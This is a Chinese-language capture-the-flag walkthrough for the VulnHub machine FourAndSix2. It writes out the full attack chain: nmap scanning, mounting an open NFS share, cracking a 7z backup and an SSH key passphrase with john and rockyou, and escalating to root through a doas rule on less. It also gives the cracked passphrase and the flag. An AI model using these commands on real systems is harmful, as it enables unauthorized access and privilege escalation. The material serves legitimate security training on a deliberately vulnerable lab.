靶机地址:https://download.vulnhub.com/fourandsix/FourAndSix2.ova

## 靶机信息
级别:容易


## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
	//IP:192.168.1.139

sudo nmap -sT --min-rate 10000 -p- 192.168.1.139
	//Ports
	PORT    STATE SERVICE
	22/tcp  open  ssh
	111/tcp open  rpcbind
	//UDP
sudo nmap -sU --min-rate 10000 -p- 192.168.1.139
	//UDP Ports
	PORT     STATE SERVICE
	111/udp  open  rpcbind
	2049/udp open  nfs

```

## nfs
```shell
// # 可能需要安装 apt-get install nfs-common
showmount -e 192.168.1.139
Export list for 192.168.1.139:
/home/user/storage (everyone)

//发现nfs共享了/home/user/storage 目录，挂载到本地
sudo mount -t nfs 192.168.1.139:/home/user/storage /tmp //这里要sudo权限

cd /tmp
得到backup.7z

```
## 暴力破解压缩包密码
### 使用rarcrack破解
```shell
7z e backup.7z //发现需要密码

//安装rarcrack
sudo apt-get install libxml2-dev
sudo apt-get install rarcrack

//rarcrack 文件名 --threads 线程数 --type rar|zip|7z

rarcrack backup.7z --threads 16 --type 7z
```

### 使用john破解
```shell
7z2john backup.7z > backup.7z_hash
john --format=7z --wordlist=/usr/share/wordlists/rockyou.txt backup.7z_hash //用john很快就能完成破解

//破解后得到ssh密钥和一些图片
xdg-open //查看图片

cat id_rsa.pub 发现用户名
```
![[Pasted image 20231006155618.png]]
```shell
//使用私钥登录，发现还需要密码，再次用john破解
ssh2john id_rsa > id_rsa_hash
john --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
```
![[Pasted image 20231006155806.png]]
```shell
ssh -i id_rsa user@192.168.1.139
Enter passphrase for key:12345678
//成功得到立足点
```
## 提权
```shell
find / -perm -u=s -type f 2>/dev/null
//发现一个  /usr/bin/doas 的文件
// /usr/bin/doas 作用类似于 sudo 

cat /etc/doas.conf
//permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
//permit nopass keepenv root as root

doas /usr/bin/less /var/log/authlog
按下v进入vi模式，输入:!sh开一个新bash，即可成功提权

flag：acd043bc3103ed3dd02eee99d5b0ff42
```
![[Pasted image 20231006162537.png]]
